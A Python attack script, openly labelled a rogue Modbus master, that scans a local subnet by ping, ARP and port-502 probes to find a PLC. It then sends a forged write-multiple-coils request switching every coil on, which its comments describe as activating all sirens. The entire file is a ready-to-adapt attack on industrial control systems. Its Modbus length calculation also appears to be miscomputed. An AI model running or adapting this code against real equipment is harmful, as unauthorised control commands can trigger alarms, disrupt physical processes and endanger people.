import socket
import struct
import time
import scapy.all as scapy
import ipaddress
import subprocess

# Configuration (Adjust to your specific environment)
TARGET_PLC_IP = None # Initially unknown, will be discovered
ROGUE_MASTER_IP = "192.168.1.100" # IP address of the Windows machine running this script
ROGUE_MASTER_PORT = 502 # Modbus port (common, adjust if necessary)
COMMUNICATION_TIMEOUT = 5  # Timeout for network operations in seconds

#  Modbus Specifics (Example, adjust according to your PLC's Modbus configuration)
MODBUS_FUNCTION_CODE_WRITE_MULTIPLE_COILS = 15  # Function code for writing multiple coils
MODBUS_STARTING_ADDRESS = 0  # Starting address of the coils to control
MODBUS_NUMBER_OF_COILS = 16  # Number of coils to write to (e.g., siren control)
MODBUS_UNIT_IDENTIFIER = 1 # Unit identifier for the PLC (often 1, but check your PLC config)

# --- Network Discovery Functions ---

def discover_plc_ip():
    """
    Discovers the PLC's IP address on the network using various methods.
    Returns the PLC's IP address as a string, or None if not found.
    """

    # Method 1: Simple ping sweep (requires administrator privileges, may be blocked by firewalls)
    try:
        print("Attempting IP discovery via ping sweep...")
        network_prefix = "192.168.1.0/24" #  Adjust this to match your network
        for ip_int in range(int(ipaddress.IPv4Network(network_prefix).network_address), int(ipaddress.IPv4Network(network_prefix).broadcast_address) + 1):
            ip = str(ipaddress.IPv4Address(ip_int))
            if ip != ROGUE_MASTER_IP:  # Avoid pinging ourselves
                try:
                    subprocess.check_output(["ping", "-n", "1", "-w", str(int(COMMUNICATION_TIMEOUT * 1000)), ip], timeout=COMMUNICATION_TIMEOUT)
                    print(f"Ping successful to {ip}, assuming it might be the PLC...") #  Possible false positives
                    return ip # Consider adding checks for Modbus communication *before* returning
                except subprocess.TimeoutExpired:
                    pass
                except subprocess.CalledProcessError: # Ping failed (host down)
                    pass
        print("Ping sweep failed to identify the PLC.")
    except Exception as e:
        print(f"Ping sweep encountered an error: {e}")
        print("Ensure you have appropriate privileges to run ping.")

    # Method 2:  ARP Scan (using Scapy, requires root privileges)
    try:
        print("Attempting IP discovery via ARP scan...")
        arp_request = scapy.ARP(pdst=network_prefix)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=COMMUNICATION_TIMEOUT, verbose=False)[0]

        for element in answered_list:
            print(f"Possible PLC found at IP: {element[1].psrc} MAC: {element[1].hwsrc}")
            return element[1].psrc  #Again, a Modbus check would be better here
        print("ARP scan failed to identify the PLC.")
    except Exception as e:
        print(f"ARP scan encountered an error: {e}")
        print("Ensure you have Scapy installed (pip install scapy) and sufficient permissions to run ARP scans (usually root/admin).")

    # Method 3:  Check a known IP range and try Modbus connection
    # This is a less desirable approach but included for completeness.  Use a small range.
    try:
        print("Attempting IP discovery by trying a limited IP range...")
        network_prefix = "192.168.1.0/24"  # Adjust this to match your network.  KEEP IT SMALL.
        for ip_int in range(int(ipaddress.IPv4Network(network_prefix).network_address), int(ipaddress.IPv4Network(network_prefix).network_address) + 20): # limit to 20 IPs
            ip = str(ipaddress.IPv4Address(ip_int))
            if ip != ROGUE_MASTER_IP:
                if check_modbus_connection(ip, ROGUE_MASTER_PORT):
                    print(f"PLC found at IP: {ip} via Modbus connection check.")
                    return ip
        print("PLC not found in the tested IP range.")
    except Exception as e:
        print(f"Error during IP range testing: {e}")


    print("Failed to discover PLC IP address.")
    return None

def check_modbus_connection(ip_address, port):
    """
    Checks if a Modbus connection can be established with the given IP address and port.
    Returns True if a connection can be established, False otherwise.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(COMMUNICATION_TIMEOUT)
        sock.connect((ip_address, port))
        sock.close()
        return True
    except socket.error as e:
        print(f"Modbus connection failed to {ip_address}:{port} - {e}")
        return False

# --- Modbus Rogue Master Functions ---

def craft_modbus_write_multiple_coils_request(transaction_identifier, unit_identifier, starting_address, number_of_coils, output_values):
    """
    Crafts a Modbus write multiple coils request.

    Args:
        transaction_identifier:  A 2-byte identifier (e.g., 1, 2, 3...) - used for matching responses
        unit_identifier: The Modbus unit identifier (often 1).
        starting_address: The starting address of the coils to write.
        number_of_coils: The number of coils to write.
        output_values: A list/tuple of boolean values (True/False) representing the coil states.

    Returns:
        A bytes object containing the Modbus request.
    """

    # Validate the number of coils
    if not 1 <= number_of_coils <= 2000:
        raise ValueError("Number of coils must be between 1 and 2000")

    # Calculate the byte count. Integer division gives how many full bytes of data.
    byte_count = (number_of_coils + 7) // 8  # Integer division

    # Build the coil data as a single bytearray, using efficient bit manipulation
    coil_data = bytearray(byte_count)
    for i, value in enumerate(output_values):
        if value:
            # Set the i-th bit to 1 if value is True, otherwise leave it at 0
            byte_index = i // 8
            bit_index = i % 8
            coil_data[byte_index] |= (1 << bit_index)

    # Build the Modbus PDU (Protocol Data Unit)
    function_code = MODBUS_FUNCTION_CODE_WRITE_MULTIPLE_COILS
    pdu = struct.pack(">BBHHB", unit_identifier, function_code, starting_address, number_of_coils, byte_count) + bytes(coil_data)

    # Build the Modbus ADU (Application Data Unit) - includes MBAP header (Modbus Application Protocol header)
    protocol_identifier = 0  # Standard Modbus/TCP
    length = len(pdu) + 2   # Length of the rest of the message (excluding MBAP header itself)
    adu = struct.pack(">HHH", transaction_identifier, protocol_identifier, length) + pdu

    return adu


def send_modbus_request(plc_ip, plc_port, request):
    """
    Sends a Modbus request to the PLC and returns the response.

    Args:
        plc_ip: The IP address of the PLC.
        plc_port: The Modbus port of the PLC.
        request: The Modbus request to send (bytes).

    Returns:
        The Modbus response (bytes), or None on error.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(COMMUNICATION_TIMEOUT)
        sock.connect((plc_ip, plc_port))
        sock.sendall(request)
        response = sock.recv(1024)  # Adjust buffer size if needed
        sock.close()
        return response
    except socket.error as e:
        print(f"Error sending/receiving Modbus data: {e}")
        return None


# --- Main Execution ---

if __name__ == "__main__":
    print("Starting Rogue Master Script...")

    # 1. Discover the PLC's IP address
    if TARGET_PLC_IP is None:
        TARGET_PLC_IP = discover_plc_ip()
        if TARGET_PLC_IP is None:
            print("PLC IP address not found.  Exiting.")
            exit()
    print(f"Target PLC IP Address: {TARGET_PLC_IP}")

    # 2. Craft a malicious Modbus request (example: activate all sirens)
    #  This is the core of the attack. Modify this to send the desired commands.
    siren_control_values = [True] * MODBUS_NUMBER_OF_COILS  # Activate all sirens in the example

    try:
        modbus_request = craft_modbus_write_multiple_coils_request(
            transaction_identifier=1234, #Arbitrary, but must be unique per request
            unit_identifier=MODBUS_UNIT_IDENTIFIER,
            starting_address=MODBUS_STARTING_ADDRESS,
            number_of_coils=MODBUS_NUMBER_OF_COILS,
            output_values=siren_control_values
        )
    except ValueError as e:
        print(f"Error crafting Modbus request: {e}")
        exit()

    # 3. Send the malicious request to the PLC
    print(f"Sending malicious Modbus request to {TARGET_PLC_IP}:{ROGUE_MASTER_PORT}...")
    response = send_modbus_request(TARGET_PLC_IP, ROGUE_MASTER_PORT, modbus_request)

    if response:
        print("Modbus request sent successfully.")
        # Optionally, analyze the response to confirm the operation succeeded
        print(f"Modbus response: {response.hex()}")  # Print response in hex for debugging
    else:
        print("Failed to send Modbus request.")

    print("Rogue Master Script completed.")